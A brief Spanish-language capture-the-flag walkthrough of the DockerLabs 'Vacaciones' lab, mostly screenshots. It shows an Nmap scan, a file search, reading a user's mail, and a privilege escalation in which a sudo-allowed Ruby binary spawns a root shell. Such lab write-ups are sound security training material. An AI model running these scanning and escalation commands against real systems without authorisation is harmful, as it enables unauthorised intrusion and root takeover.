
![Vacaciones](https://github.com/falart3/dockerlabs/blob/main/vc_001.png)

Realizamos el escaneo con Nmap sobre la dirección IP 172.17.0.2 para revelar resultados.
```
nmap -p- -sS -sCV -T4 -n -Pn 172.17.0.2
```
![Vacaciones](https://github.com/falart3/dockerlabs/blob/main/vc_002.png)

<h3>Análisis de los Servicios Abiertos</h3>
SSH (Puerto 22):

La versión de OpenSSH detectada es relativamente antigua (7.6p1), lo que podría ser vulnerable si no está debidamente actualizada.

HTTP (Puerto 80):
El servidor web Apache 2.4.29 también es una versión que podría tener vulnerabilidades, ya que ha habido actualizaciones importantes desde entonces. 

Lista a seguir:<br>
investigar si existen vulnerabilidades para el puerto 22
investigar posibles exploits o revisar configuraciones incorrectas en el puerto 80

![Vacaciones](https://github.com/falart3/dockerlabs/blob/main/vc_0021.png)

![Vacaciones](https://github.com/falart3/dockerlabs/blob/main/vc_003.png)

![Vacaciones](https://github.com/falart3/dockerlabs/blob/main/vc_004.png)

![Vacaciones](https://github.com/falart3/dockerlabs/blob/main/vc_005.png)
```
find / -name "*.txt" 2>/dev/null
```

![Vacaciones](https://github.com/falart3/dockerlabs/blob/main/vc_006.png)
```
cat /var/mail/camilo/correo.txt
```
![Vacaciones](https://github.com/falart3/dockerlabs/blob/main/vc_007.png)

![Vacaciones](https://github.com/falart3/dockerlabs/blob/main/vc_008.png)
```
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
```
![Vacaciones](https://github.com/falart3/dockerlabs/blob/main/vc_009.png)
